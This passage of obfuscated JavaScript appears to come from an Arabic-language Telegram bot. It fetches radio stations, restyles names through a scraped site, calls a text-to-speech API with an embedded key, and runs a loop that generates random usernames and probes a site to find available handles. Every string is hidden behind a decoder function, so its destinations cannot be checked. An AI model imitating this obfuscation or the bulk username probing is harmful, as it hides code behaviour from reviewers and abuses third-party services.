            'XpxaT': function (_0x526cca, _0x26232b) {
                return _0x526cca % _0x26232b;
            },
            'yZvNQ': function (_0x456f6f, _0x53293d) {
                return _0x456f6f - _0x53293d;
            },
            'psErd': _0x290b49(0x5d6) + _0x290b49(0x7bd),
            'saPrz': function (_0x3a1665, _0x50beef, _0x30cb0f) {
                return _0x3a1665(_0x50beef, _0x30cb0f);
            },
            'lPlQp': function (_0x495141, _0x4f677b, _0xfacc09) {
                return _0x495141(_0x4f677b, _0xfacc09);
            },
            'CKMYI': function (_0x5bb7d6, _0x262b0d) {
                return _0x5bb7d6 < _0x262b0d;
            },
            'QjGHA': function (_0x3c1f0b, _0x3c85ff) {
                return _0x3c1f0b - _0x3c85ff;
            },
            'lbhUx': _0x290b49(0x874),
            'NjsRN': function (_0x1d4d5a, _0x57b786) {
                return _0x1d4d5a + _0x57b786;
            },
            'vYEQk': _0x290b49(0x67a) + _0x290b49(0xe28),
            'YEtnv': _0x290b49(0xd76) + _0x290b49(0x33c) + ':',
            'DEUDb': _0x290b49(0x4cf),
            'VqOBS': _0x290b49(0x41b) + _0x290b49(0x4de) + _0x290b49(0x863) + '0%',
            'fykIy': _0x290b49(0x56d) + _0x290b49(0xaf0),
            'bodDg': _0x290b49(0x729) + _0x290b49(0x557),
            'JkbEy': _0x290b49(0x48e) + _0x290b49(0x230),
            'Wpurt': _0x290b49(0xcad) + _0x290b49(0x3c0),
            'HrEIf': function (_0x4a441b, _0x47f4db) {
                return _0x4a441b < _0x47f4db;
            },
            'frYrj': function (_0x350c98, _0xcb0205) {
                return _0x350c98(_0xcb0205);
            }
        }, {
            data: _0x54b8e,
            message: _0x40c615
        } = _0x3cef34;
    if (_0x54b8e[_0x290b49(0xd2d)](_0x46e351[_0x290b49(0x81b)])) {
        const _0x1b563e = _0x46e351[_0x290b49(0x759)](parseInt, _0x54b8e[_0x290b49(0x7aa)]('_')[-0x2610 + -0xfde + -0x11fb * -0x3], -0x25 * -0xd1 + 0xcc6 + 0x2af1 * -0x1), _0x587457 = Object[_0x290b49(0x726)](radioCountries), _0x12827e = _0x46e351[_0x290b49(0x70f)](splitRadioCountries, _0x587457, 0x14a5 + -0x3a * -0x6e + -0x2d4b), _0x34ad4a = [];
        _0x12827e[_0x1b563e] && (_0x12827e[_0x1b563e][_0x290b49(0xcba)](([_0x903c62, _0x1132b6], _0x5798fc) => {
            const _0x24df17 = _0x290b49;
            if (_0x46e351[_0x24df17(0xaf4)](_0x46e351[_0x24df17(0xcb8)](_0x5798fc, 0xeb7 * -0x1 + 0x1acb + -0xc11), -0x269 + 0x81e + 0x1e7 * -0x3))
                _0x34ad4a[_0x24df17(0xb97)]([]);
            _0x34ad4a[_0x46e351[_0x24df17(0x881)](_0x34ad4a[_0x24df17(0x574)], 0x25 * 0xdb + 0x10b5 * -0x1 + 0xf * -0xff)][_0x24df17(0xb97)]({
                'text': _0x1132b6,
                'callback_data': _0x24df17(0x4cf) + _0x903c62
            });
        }), _0x46e351[_0x290b49(0xc70)](_0x1b563e, _0x46e351[_0x290b49(0x31d)](_0x12827e[_0x290b49(0x574)], -0xc3f + 0x88e * -0x4 + -0x173c * -0x2)) && _0x34ad4a[_0x290b49(0xb97)]([{
                'text': _0x46e351[_0x290b49(0x1a0)],
                'callback_data': _0x290b49(0x5d6) + _0x290b49(0xa24) + _0x46e351[_0x290b49(0x335)](_0x1b563e, -0x3 * -0x595 + -0x10d4 + -0x16 * -0x1)
            }]));
        const _0x2230f1 = { 'reply_markup': { 'inline_keyboard': _0x34ad4a } };
        _0x46e351[_0x290b49(0xaf4)](_0x34ad4a[_0x290b49(0x574)], 0x2677 + 0x12fd + -0x3974) ? await bot[_0x290b49(0x741) + 'e'](_0x40c615[_0x290b49(0x6a9)]['id'], _0x46e351[_0x290b49(0xb4b)]) : await bot[_0x290b49(0x708) + _0x290b49(0xdb0)](_0x46e351[_0x290b49(0xcdb)], {
            'chat_id': _0x40c615[_0x290b49(0x6a9)]['id'],
            'message_id': _0x40c615[_0x290b49(0x57f)],
            'reply_markup': _0x2230f1[_0x290b49(0x54f) + 'up']
        });
    }
    if (_0x54b8e[_0x290b49(0xd2d)](_0x46e351[_0x290b49(0xa74)])) {
        const _0xda1fa2 = _0x54b8e[_0x290b49(0x7aa)]('_')[0x2095 + 0xb3f + -0x2bd3], _0x2f3c94 = radioCountries[_0xda1fa2];
        let _0x398d75 = await bot[_0x290b49(0x741) + 'e'](_0x40c615[_0x290b49(0x6a9)]['id'], _0x46e351[_0x290b49(0x822)]);
        const _0x5ef631 = [
            _0x46e351[_0x290b49(0xb14)],
            _0x46e351[_0x290b49(0xde7)],
            _0x46e351[_0x290b49(0x27d)],
            _0x46e351[_0x290b49(0x712)]
        ];
        for (let _0x55ef20 = 0x709 * 0x4 + 0x2437 + -0xcdf * 0x5; _0x46e351[_0x290b49(0xcdf)](_0x55ef20, _0x5ef631[_0x290b49(0x574)]); _0x55ef20++) {
            await new Promise(_0x37111c => setTimeout(_0x37111c, -0x8ed + 0x1182 + -0xc5)), await bot[_0x290b49(0x708) + _0x290b49(0xdb0)](_0x290b49(0x41b) + _0x290b49(0x7e6) + _0x5ef631[_0x55ef20], {
                'chat_id': _0x40c615[_0x290b49(0x6a9)]['id'],
                'message_id': _0x398d75[_0x290b49(0x57f)]
            });
        }
        await new Promise(_0x1ae39f => setTimeout(_0x1ae39f, -0x2f6 * -0x4 + 0x81 * 0x29 + -0x1c99)), await bot[_0x290b49(0x802) + _0x290b49(0x909)](_0x40c615[_0x290b49(0x6a9)]['id'], _0x398d75[_0x290b49(0x57f)]);
        const _0x9c2024 = await _0x46e351[_0x290b49(0xa50)](fetchRadioStationsByCountry, _0xda1fa2);
        let _0x50ed39 = _0x9c2024[_0x290b49(0x574)] ? _0x290b49(0x98b) + _0x290b49(0xb02) + _0x290b49(0x4c9) + _0x2f3c94 + ':\x0a' : _0x290b49(0x524) + _0x290b49(0xa72) + _0x290b49(0xd4a) + _0x2f3c94 + '.';
        _0x9c2024[_0x290b49(0x887)](0xb43 + 0x73 * -0x56 + 0x1b5f, 0x3 * 0xcec + 0x6be + -0x2d5a)[_0x290b49(0xcba)](_0x3adf66 => {
            const _0x1bd37f = _0x290b49;
            _0x50ed39 += _0x1bd37f(0x445) + ':\x20' + _0x3adf66[_0x1bd37f(0x958)] + (_0x1bd37f(0x3d0) + ':\x20') + _0x3adf66[_0x1bd37f(0xd7a)] + '\x0a\x0a';
        }), bot[_0x290b49(0x741) + 'e'](_0x40c615[_0x290b49(0x6a9)]['id'], _0x50ed39);
    }
});
const userStates = {};
async function زخرفة_الاسم(_0x178b13) {
    const _0xde9d34 = _0x54266d, _0x552413 = {
            'uEaGY': function (_0x24cd9d, _0x22304a) {
                return _0x24cd9d(_0x22304a);
            },
            'jbcoX': _0xde9d34(0xd15) + _0xde9d34(0x8fd) + _0xde9d34(0x591) + _0xde9d34(0x8a7),
            'AdnAW': _0xde9d34(0xc02) + _0xde9d34(0x42e),
            'aiUrO': _0xde9d34(0xc2d),
            'TKrQz': _0xde9d34(0x68f) + _0xde9d34(0x922) + _0xde9d34(0xa61) + _0xde9d34(0xad9),
            'XDnPt': _0xde9d34(0x9d8) + _0xde9d34(0x5cf) + _0xde9d34(0x48c) + _0xde9d34(0x1d6) + _0xde9d34(0x94b),
            'dAhDU': _0xde9d34(0xbc7) + _0xde9d34(0x62f) + _0xde9d34(0xc89) + _0xde9d34(0x893) + _0xde9d34(0x956) + _0xde9d34(0x74f) + _0xde9d34(0xa25) + _0xde9d34(0xdb4) + _0xde9d34(0xba1) + _0xde9d34(0xa9a) + _0xde9d34(0x3bb) + '6',
            'RIfve': _0xde9d34(0x958),
            'NlNoy': _0xde9d34(0x4bf),
            'TVopK': function (_0xe50a7, _0x203573) {
                return _0xe50a7 === _0x203573;
            },
            'GZIFI': function (_0x2ee500, _0xbf95e2) {
                return _0x2ee500(_0xbf95e2);
            },
            'Khxqe': _0xde9d34(0xc8e) + _0xde9d34(0xbfb) + _0xde9d34(0x833) + 'n'
        }, _0x23e05b = _0x552413[_0xde9d34(0x925)], _0x5c600b = {
            'authority': _0x552413[_0xde9d34(0x6f4)],
            'accept': _0x552413[_0xde9d34(0xaae)],
            'accept-language': _0x552413[_0xde9d34(0xa62)],
            'content-type': _0x552413[_0xde9d34(0xdd7)],
            'user-agent': _0x552413[_0xde9d34(0x268)]
        }, _0x3ec583 = new URLSearchParams();
    _0x3ec583[_0xde9d34(0x9f8)](_0x552413[_0xde9d34(0x547)], _0x178b13), _0x3ec583[_0xde9d34(0x9f8)](_0x552413[_0xde9d34(0x7a6)], '');
    try {
        const _0x3ff459 = await axios[_0xde9d34(0xa54)](_0x23e05b, _0x3ec583, { 'headers': _0x5c600b });
        if (_0x552413[_0xde9d34(0xb49)](_0x3ff459[_0xde9d34(0x972)], -0xdb4 + 0x4 + 0xe78)) {
            const _0x1190e3 = cheerio[_0xde9d34(0x1be)](_0x3ff459[_0xde9d34(0x50f)]), _0xcde904 = _0x552413[_0xde9d34(0xca1)](_0x1190e3, _0x552413[_0xde9d34(0xd34)]), _0x453d38 = [];
            return _0xcde904[_0xde9d34(0x90f)]((_0x115f91, _0x4fea91) => {
                const _0x2e91de = _0xde9d34;
                _0x453d38[_0x2e91de(0xb97)](_0x552413[_0x2e91de(0xb92)](_0x1190e3, _0x4fea91)[_0x2e91de(0x9ac)]());
            }), _0x453d38;
        } else
            return null;
    } catch (_0xd0228e) {
        return console[_0xde9d34(0x3a5)](_0xd0228e), null;
    }
}
bot[_0x54266d(0xb39)](/\/stظصakعصمrt/, _0x567571 => {
    const _0x38e1f7 = _0x54266d, _0x16d4dd = {
            'LXjrJ': _0x38e1f7(0xc7d) + _0x38e1f7(0xb80),
            'OpOsJ': _0x38e1f7(0x84d),
            'SjwHH': _0x38e1f7(0x25f) + _0x38e1f7(0xc30) + _0x38e1f7(0x1e4) + _0x38e1f7(0x771)
        }, _0x4c5f21 = _0x567571[_0x38e1f7(0x6a9)]['id'], _0x2bfdd4 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x16d4dd[_0x38e1f7(0x323)],
                            'callback_data': _0x16d4dd[_0x38e1f7(0x983)]
                        }]]
            }
        };
    bot[_0x38e1f7(0x741) + 'e'](_0x4c5f21, _0x16d4dd[_0x38e1f7(0xc16)], _0x2bfdd4);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x21d912 => {
    const _0x3745c5 = _0x54266d, _0x60f90e = {
            'RJFHP': function (_0x2ca57a, _0x3bbde1) {
                return _0x2ca57a === _0x3bbde1;
            },
            'cLIwY': _0x3745c5(0x84d),
            'OxASm': _0x3745c5(0xb3b) + _0x3745c5(0x9ce) + _0x3745c5(0x64d)
        }, _0x484cdd = _0x21d912[_0x3745c5(0x842)], _0x369119 = _0x484cdd[_0x3745c5(0x6a9)]['id'];
    _0x60f90e[_0x3745c5(0xc82)](_0x21d912[_0x3745c5(0x50f)], _0x60f90e[_0x3745c5(0x373)]) && (userStates[_0x369119] = { 'awaitingName': !![] }, bot[_0x3745c5(0x741) + 'e'](_0x369119, _0x60f90e[_0x3745c5(0x2da)]));
}), bot['on'](_0x54266d(0x842), async _0x4ddd42 => {
    const _0x565a5a = _0x54266d, _0x5e3d03 = {
            'zdaRx': function (_0x587bae, _0x46db77) {
                return _0x587bae(_0x46db77);
            },
            'oOsdW': _0x565a5a(0x6a4) + _0x565a5a(0xa7c) + _0x565a5a(0x498) + _0x565a5a(0xbac)
        }, _0xfc2edf = _0x4ddd42[_0x565a5a(0x6a9)]['id'];
    if (userStates[_0xfc2edf] && userStates[_0xfc2edf][_0x565a5a(0xd7e) + 'me']) {
        const _0xb280d9 = _0x4ddd42[_0x565a5a(0x9ac)], _0x807ac5 = await _0x5e3d03[_0x565a5a(0x768)](زخرفة_الاسم, _0xb280d9);
        _0x807ac5 ? _0x807ac5[_0x565a5a(0xcba)](_0x442574 => {
            const _0x5f3a1f = _0x565a5a;
            bot[_0x5f3a1f(0x741) + 'e'](_0xfc2edf, _0x442574);
        }) : bot[_0x565a5a(0x741) + 'e'](_0xfc2edf, _0x5e3d03[_0x565a5a(0x61a)]), userStates[_0xfc2edf][_0x565a5a(0xd7e) + 'me'] = ![];
    }
});
const userSessions = {};
async function textToSpeech(_0x4624a0, _0x1a4c49) {
    const _0x3392a8 = _0x54266d, _0x7eac15 = {
            'aFaER': _0x3392a8(0xde4) + _0x3392a8(0xbad) + _0x3392a8(0x6dd) + _0x3392a8(0x4ad) + _0x3392a8(0x88a) + _0x3392a8(0xb63),
            'OwfYP': _0x3392a8(0xa3a),
            'mQLlj': _0x3392a8(0xdb2),
            'IVlRq': function (_0x7508a3, _0x18652a) {
                return _0x7508a3 === _0x18652a;
            },
            'tHFUw': _0x3392a8(0x3fe),
            'HorpQ': _0x3392a8(0xd8c),
            'kodDt': _0x3392a8(0xc2d),
            'SBKkj': _0x3392a8(0x68f) + _0x3392a8(0x922) + _0x3392a8(0xa61) + _0x3392a8(0xad9),
            'ZNVTw': _0x3392a8(0x1cc) + _0x3392a8(0x20e) + _0x3392a8(0x608),
            'dsjUr': _0x3392a8(0xbc7) + _0x3392a8(0x62f) + _0x3392a8(0xc89) + _0x3392a8(0x893) + _0x3392a8(0x956) + _0x3392a8(0x74f) + _0x3392a8(0xa25) + _0x3392a8(0xdb4) + _0x3392a8(0xba1) + _0x3392a8(0xa9a) + _0x3392a8(0x3bb) + '6',
            'WCtzu': _0x3392a8(0x2df) + 'r',
            'yhAJl': _0x3392a8(0x275) + _0x3392a8(0x3e2) + _0x3392a8(0xd0a) + _0x3392a8(0x277) + _0x3392a8(0xc8a),
            'zhRTX': function (_0x4eb9ab, _0x5681ea) {
                return _0x4eb9ab(_0x5681ea);
            }
        }, _0x5201a1 = _0x7eac15[_0x3392a8(0xcf8)], _0x4ec215 = {
            'text': _0x4624a0,
            'lang': 'ar',
            'engine': 'g3',
            'pitch': _0x7eac15[_0x3392a8(0x88b)],
            'rate': _0x7eac15[_0x3392a8(0x88b)],
            'volume': '1',
            'key': _0x7eac15[_0x3392a8(0x4fc)],
            'gender': _0x7eac15[_0x3392a8(0xa9d)](_0x1a4c49, _0x7eac15[_0x3392a8(0x242)]) ? _0x7eac15[_0x3392a8(0x242)] : _0x7eac15[_0x3392a8(0x23f)]
        }, _0x371e06 = {
            'accept': _0x7eac15[_0x3392a8(0x6b9)],
            'accept-language': _0x7eac15[_0x3392a8(0x79e)],
            'referer': _0x7eac15[_0x3392a8(0x7a8)],
            'user-agent': _0x7eac15[_0x3392a8(0x3be)]
        };
    try {
        const _0x44e43c = await axios[_0x3392a8(0x4bf)](_0x5201a1, {
            'params': _0x4ec215,
            'headers': _0x371e06,
            'responseType': _0x7eac15[_0x3392a8(0xafa)]
        });
        return Readable[_0x3392a8(0x8e6)](_0x44e43c[_0x3392a8(0x50f)]);
    } catch (_0x25c06f) {
        return console[_0x3392a8(0x3a5)](_0x7eac15[_0x3392a8(0xda9)]), await _0x7eac15[_0x3392a8(0x905)](retryWithEnglish, _0x1a4c49);
    }
}
async function retryWithEnglish(_0x166200) {
    const _0x24ada5 = _0x54266d, _0x12b44e = {
            'lKPke': _0x24ada5(0x877) + _0x24ada5(0xbfc) + _0x24ada5(0xa9f) + _0x24ada5(0xb2b),
            'UhQNe': _0x24ada5(0xde4) + _0x24ada5(0xbad) + _0x24ada5(0x6dd) + _0x24ada5(0x4ad) + _0x24ada5(0x88a) + _0x24ada5(0xb63),
            'mZkQG': _0x24ada5(0xa3a),
            'GcxxP': _0x24ada5(0xdb2),
            'PtDOw': function (_0x534274, _0x43dd90) {
                return _0x534274 === _0x43dd90;
            },
            'NnRPZ': _0x24ada5(0x3fe),
            'JYNlf': _0x24ada5(0xd8c),
            'LCcGC': _0x24ada5(0xc2d),
            'VtNVK': _0x24ada5(0x954) + _0x24ada5(0x9a2),
            'ZDSPI': _0x24ada5(0x1cc) + _0x24ada5(0x20e) + _0x24ada5(0x608),
            'Ldnvy': _0x24ada5(0xbc7) + _0x24ada5(0x62f) + _0x24ada5(0xc89) + _0x24ada5(0x893) + _0x24ada5(0x956) + _0x24ada5(0x74f) + _0x24ada5(0xa25) + _0x24ada5(0xdb4) + _0x24ada5(0xba1) + _0x24ada5(0xa9a) + _0x24ada5(0x3bb) + '6',
            'bRmaL': _0x24ada5(0x2df) + 'r'
        }, _0x11c840 = _0x12b44e[_0x24ada5(0x4ee)], _0x4430b2 = _0x12b44e[_0x24ada5(0x651)], _0x4a5fe4 = {
            'text': _0x11c840,
            'lang': 'en',
            'engine': 'g3',
            'pitch': _0x12b44e[_0x24ada5(0x8b7)],
            'rate': _0x12b44e[_0x24ada5(0x8b7)],
            'volume': '1',
            'key': _0x12b44e[_0x24ada5(0x919)],
            'gender': _0x12b44e[_0x24ada5(0xbde)](_0x166200, _0x12b44e[_0x24ada5(0x228)]) ? _0x12b44e[_0x24ada5(0x228)] : _0x12b44e[_0x24ada5(0x4da)]
        }, _0xc4b772 = {
            'accept': _0x12b44e[_0x24ada5(0x88c)],
            'accept-language': _0x12b44e[_0x24ada5(0x721)],
            'referer': _0x12b44e[_0x24ada5(0x354)],
            'user-agent': _0x12b44e[_0x24ada5(0xa16)]
        };
    try {
        const _0x40308d = await axios[_0x24ada5(0x4bf)](_0x4430b2, {
            'params': _0x4a5fe4,
            'headers': _0xc4b772,
            'responseType': _0x12b44e[_0x24ada5(0xd4e)]
        });
        return Readable[_0x24ada5(0x8e6)](_0x40308d[_0x24ada5(0x50f)]);
    } catch (_0x5baefc) {
        return null;
    }
}
bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x39a6df => {
    const _0x5b0426 = _0x54266d, _0x381c5f = {
            'sOHnL': function (_0x1d8096, _0x2d6214) {
                return _0x1d8096 === _0x2d6214;
            },
            'bBgeh': _0x5b0426(0x7fc) + 'xt',
            'TMwVc': _0x5b0426(0x288),
            'WzmVJ': _0x5b0426(0x376),
            'Eltup': _0x5b0426(0x4c8),
            'aReFn': _0x5b0426(0xa48) + 'ce',
            'yMeGY': _0x5b0426(0x3b4) + _0x5b0426(0xa2d),
            'KVrvB': function (_0x562715, _0x2f206b) {
                return _0x562715 === _0x2f206b;
            },
            'MSpBm': _0x5b0426(0x3fe),
            'LGOAG': _0x5b0426(0xd8c),
            'fPueO': _0x5b0426(0xc49),
            'ihvfa': _0x5b0426(0x56f)
        }, _0xbdfcf8 = _0x39a6df[_0x5b0426(0x842)][_0x5b0426(0x6a9)]['id'];
    if (_0x381c5f[_0x5b0426(0xd3c)](_0x39a6df[_0x5b0426(0x50f)], _0x381c5f[_0x5b0426(0x705)])) {
        userSessions[_0xbdfcf8] = {
            'gender': null,
            'text': null
        };
        const _0x1d58e1 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x381c5f[_0x5b0426(0x92a)],
                            'callback_data': _0x381c5f[_0x5b0426(0x9a1)]
                        }],
                    [{
                            'text': _0x381c5f[_0x5b0426(0x621)],
                            'callback_data': _0x381c5f[_0x5b0426(0x31e)]
                        }]
                ]
            }
        };
        bot[_0x5b0426(0x741) + 'e'](_0xbdfcf8, _0x381c5f[_0x5b0426(0xa05)], _0x1d58e1);
    } else {
        if (_0x381c5f[_0x5b0426(0x536)](_0x39a6df[_0x5b0426(0x50f)], _0x381c5f[_0x5b0426(0x9a1)]) || _0x381c5f[_0x5b0426(0xd3c)](_0x39a6df[_0x5b0426(0x50f)], _0x381c5f[_0x5b0426(0x31e)])) {
            const _0x93ca3b = _0x381c5f[_0x5b0426(0xd3c)](_0x39a6df[_0x5b0426(0x50f)], _0x381c5f[_0x5b0426(0x9a1)]) ? _0x381c5f[_0x5b0426(0x8bb)] : _0x381c5f[_0x5b0426(0x2aa)];
            userSessions[_0xbdfcf8][_0x5b0426(0xc7a)] = _0x93ca3b, bot[_0x5b0426(0x708) + _0x5b0426(0x949) + 'up']({ 'inline_keyboard': [] }, {
                'chat_id': _0xbdfcf8,
                'message_id': _0x39a6df[_0x5b0426(0x842)][_0x5b0426(0x57f)]
            }), bot[_0x5b0426(0x741) + 'e'](_0xbdfcf8, _0x5b0426(0x1a5) + _0x5b0426(0xc7c) + _0x5b0426(0x8e3) + _0x5b0426(0x64b) + _0x5b0426(0x52d) + (_0x381c5f[_0x5b0426(0xd3c)](_0x93ca3b, _0x381c5f[_0x5b0426(0x8bb)]) ? _0x381c5f[_0x5b0426(0x1d5)] : _0x381c5f[_0x5b0426(0xa0f)]) + '.');
        }
    }
}), bot['on'](_0x54266d(0x842), async _0x10a97c => {
    const _0x25679f = _0x54266d, _0x220cfb = {
            'chTvQ': function (_0x5177c4, _0x98cf1a, _0x9bfd10) {
                return _0x5177c4(_0x98cf1a, _0x9bfd10);
            },
            'QaTqh': _0x25679f(0xc0e) + _0x25679f(0xb95) + _0x25679f(0x933) + _0x25679f(0x81a)
        }, _0x1ca462 = _0x10a97c[_0x25679f(0x6a9)]['id'];
    if (userSessions[_0x1ca462] && userSessions[_0x1ca462][_0x25679f(0xc7a)]) {
        const _0x496ac5 = _0x10a97c[_0x25679f(0x9ac)];
        userSessions[_0x1ca462][_0x25679f(0x9ac)] = _0x496ac5;
        const _0x57ace5 = userSessions[_0x1ca462][_0x25679f(0xc7a)], _0x1b82f3 = await _0x220cfb[_0x25679f(0x840)](textToSpeech, _0x496ac5, _0x57ace5);
        _0x1b82f3 ? bot[_0x25679f(0xdd8)](_0x1ca462, _0x1b82f3) : bot[_0x25679f(0x741) + 'e'](_0x1ca462, _0x220cfb[_0x25679f(0x9c5)]), delete userSessions[_0x1ca462];
    }
});
let md = 0x1f44 + 0x26ca + -0x460e, validUsers = 0x12fd + 0x493 * 0x4 + -0x2549, checkedUsers = -0xa0 * -0x20 + 0xdf2 + 0x16 * -0x18b, userList = [];
const abc1 = _0x54266d(0x45f) + _0x54266d(0xc87) + _0x54266d(0xbd5) + _0x54266d(0xccd) + _0x54266d(0x86c) + _0x54266d(0xc7f) + _0x54266d(0x2db) + _0x54266d(0x67f) + _0x54266d(0x544);
async function startSearch(_0x3e5410, _0x11ac3f, _0x1f24d0) {
    const _0x44a853 = _0x54266d, _0x1f8b05 = {
            'QpsMP': function (_0x1cdbd8, _0x53ec39) {
                return _0x1cdbd8 < _0x53ec39;
            },
            'xcDWw': function (_0x4c8d03, _0x4194b2) {
                return _0x4c8d03 === _0x4194b2;
            },
            'tcEQJ': _0x44a853(0x2bd),
            'AUvaU': function (_0x184277, _0x54f7d1) {
                return _0x184277 * _0x54f7d1;
            },
            'eTDDj': function (_0x20ab75, _0x5e20e3) {
                return _0x20ab75 * _0x5e20e3;
            },
            'UUmfC': function (_0x56e0c4, _0x5157b5) {
                return _0x56e0c4 * _0x5157b5;
            },
            'sNeHa': _0x44a853(0x489),
            'KYYBn': _0x44a853(0x1db),
            'YRgzx': function (_0x349d16, _0x67b4a9) {
                return _0x349d16 + _0x67b4a9;
            },
            'KROPF': function (_0xfa1b08, _0x311c96) {
                return _0xfa1b08 + _0x311c96;
            },
            'OuurW': function (_0x4760b7, _0x26515f) {
                return _0x4760b7 * _0x26515f;
            },
            'LTjiV': function (_0x33da98, _0x2e3b73) {
                return _0x33da98 === _0x2e3b73;
            },
            'KehDz': _0x44a853(0x921) + 'e',
            'JISUa': function (_0x1f8084, _0x2b9f74) {
                return _0x1f8084 + _0x2b9f74;
            },
            'ZcQVx': function (_0x2813f1, _0x10a2f2) {
                return _0x2813f1 * _0x10a2f2;
            },
            'PwzyT': _0x44a853(0x9ee),
            'pGUMD': function (_0x2e6e43, _0x816c78) {
                return _0x2e6e43 + _0x816c78;
            },
            'IvmFs': function (_0x34ffec, _0x365c68) {
                return _0x34ffec * _0x365c68;
            },
            'eIJLp': function (_0x2487c8, _0x9701eb) {
                return _0x2487c8 - _0x9701eb;
            },
            'alRNf': function (_0x129082, _0x3b48d3, _0x469fe9, _0x1be1d8) {
                return _0x129082(_0x3b48d3, _0x469fe9, _0x1be1d8);
            },
            'pcPgq': _0x44a853(0x6f9) + _0x44a853(0x6ff),
            'YjpON': function (_0x481410, _0x14000c) {
                return _0x481410(_0x14000c);
            }
        };
    userList = [];
    for (let _0x37dd27 = -0x3 * -0xcc7 + -0xebc + -0x1 * 0x1799; _0x1f8b05[_0x44a853(0xb40)](_0x37dd27, 0x391 * -0x2 + 0x1877 + -0x114b * 0x1); _0x37dd27++) {
        let _0x1a8e23 = '';
        if (_0x1f8b05[_0x44a853(0x1fc)](_0x1f24d0, _0x1f8b05[_0x44a853(0x675)])) {
            let _0x53310d = abc1[Math[_0x44a853(0xd54)](_0x1f8b05[_0x44a853(0x918)](Math[_0x44a853(0x9ee)](), abc1[_0x44a853(0x574)]))], _0x5ad194 = abc1[Math[_0x44a853(0xd54)](_0x1f8b05[_0x44a853(0x34b)](Math[_0x44a853(0x9ee)](), abc1[_0x44a853(0x574)]))], _0x52de9d = abc1[Math[_0x44a853(0xd54)](_0x1f8b05[_0x44a853(0x34b)](Math[_0x44a853(0x9ee)](), abc1[_0x44a853(0x574)]))], _0x3d5034 = abc1[Math[_0x44a853(0xd54)](_0x1f8b05[_0x44a853(0x772)](Math[_0x44a853(0x9ee)](), abc1[_0x44a853(0x574)]))];
            _0x1a8e23 = _0x5ad194 + '_' + _0x53310d + _0x52de9d;
        } else {
            if (_0x1f8b05[_0x44a853(0x1fc)](_0x1f24d0, _0x1f8b05[_0x44a853(0x89e)]))
                _0x1a8e23 = Array[_0x44a853(0x8e6)]({ 'length': 0x4 }, () => abc1[Math[_0x44a853(0xd54)](Math[_0x44a853(0x9ee)]() * abc1[_0x44a853(0x574)])])[_0x44a853(0x75e)]('');
            else {
                if (_0x1f8b05[_0x44a853(0x1fc)](_0x1f24d0, _0x1f8b05[_0x44a853(0x8be)]))
                    _0x1a8e23 = _0x1f8b05[_0x44a853(0x52b)](_0x1f8b05[_0x44a853(0x8bf)](Array[_0x44a853(0x8e6)]({ 'length': 0x3 }, () => abc1[Math[_0x44a853(0xd54)](Math[_0x44a853(0x9ee)]() * abc1[_0x44a853(0x574)])])[_0x44a853(0x75e)](''), '_'), abc1[Math[_0x44a853(0xd54)](_0x1f8b05[_0x44a853(0x32c)](Math[_0x44a853(0x9ee)](), abc1[_0x44a853(0x574)]))]);
                else {
                    if (_0x1f8b05[_0x44a853(0xa34)](_0x1f24d0, _0x1f8b05[_0x44a853(0x5fb)]))
                        _0x1a8e23 = _0x1f8b05[_0x44a853(0x8bf)](_0x1f8b05[_0x44a853(0x944)](Array[_0x44a853(0x8e6)]({ 'length': 0x2 }, () => abc1[Math[_0x44a853(0xd54)](Math[_0x44a853(0x9ee)]() * abc1[_0x44a853(0x574)])])[_0x44a853(0x75e)](''), '_'), abc1[Math[_0x44a853(0xd54)](_0x1f8b05[_0x44a853(0x610)](Math[_0x44a853(0x9ee)](), abc1[_0x44a853(0x574)]))]);
                    else {
                        if (_0x1f8b05[_0x44a853(0x1fc)](_0x1f24d0, _0x1f8b05[_0x44a853(0x257)])) {
                            let _0x5cca82 = _0x1f8b05[_0x44a853(0xb57)](Math[_0x44a853(0xd54)](_0x1f8b05[_0x44a853(0x4b7)](Math[_0x44a853(0x9ee)](), _0x1f8b05[_0x44a853(0x8bf)](_0x1f8b05[_0x44a853(0x9d0)](-0xce6 + 0x1023 + 0x113 * -0x3, -0x14ab + -0xd * -0x137 + 0x1a1 * 0x3), -0x1 * 0xf39 + 0x835 + 0x3 * 0x257))), 0xe1f + 0x74d + -0x1569);
                            _0x1a8e23 = Array[_0x44a853(0x8e6)]({ 'length': _0x5cca82 }, () => abc1[Math[_0x44a853(0xd54)](Math[_0x44a853(0x9ee)]() * abc1[_0x44a853(0x574)])])[_0x44a853(0x75e)]('');
                        } else
                            _0x1a8e23 = Array[_0x44a853(0x8e6)]({ 'length': 0x4 }, () => abc1[Math[_0x44a853(0xd54)](Math[_0x44a853(0x9ee)]() * abc1[_0x44a853(0x574)])])[_0x44a853(0x75e)]('');
                    }
                }
            }
        }
        try {
            const _0x3e0608 = await axios[_0x44a853(0x4bf)](_0x44a853(0xcd2) + _0x44a853(0x3f3) + _0x1a8e23);
            checkedUsers++, _0x1f8b05[_0x44a853(0x878)](updateButtons, _0x3e5410, _0x11ac3f, _0x1a8e23);
            if (_0x3e0608[_0x44a853(0x50f)][_0x44a853(0x439)](_0x1f8b05[_0x44a853(0x331)]))
                validUsers++, bot[_0x44a853(0x741) + 'e'](_0x3e5410, _0x44a853(0x440) + _0x44a853(0x2dc) + _0x44a853(0xd9f) + _0x1a8e23), userList[_0x44a853(0xb97)](_0x1a8e23);
            else {
            }
            md++;
        } catch (_0x10bfab) {
            console[_0x44a853(0x3a5)](_0x10bfab);
        }
        await new Promise(_0xa86641 => setTimeout(_0xa86641, 0x59d * 0x4 + -0x16a6 + -0xe * -0x4b));
    }
    _0x1f8b05[_0x44a853(0xa8c)](showFinalStatistics, _0x3e5410);
}
function updateButtons(_0x32cfd8, _0x5dd632, _0x290582) {
    const _0x1a6a19 = _0x54266d, _0x49808f = {
            'fENvJ': _0x1a6a19(0xcd5),
            'ddLbH': _0x1a6a19(0xc21),
            'iLKvh': _0x1a6a19(0x25a)
        }, _0x2c67b1 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x1a6a19(0xca5) + '\x20' + _0x290582,
                            'callback_data': _0x49808f[_0x1a6a19(0xb9a)]
                        }],
                    [{
                            'text': _0x1a6a19(0xdbb) + _0x1a6a19(0x5bb) + _0x1a6a19(0x611) + checkedUsers,
                            'callback_data': _0x49808f[_0x1a6a19(0xcbb)]
                        }],
                    [{
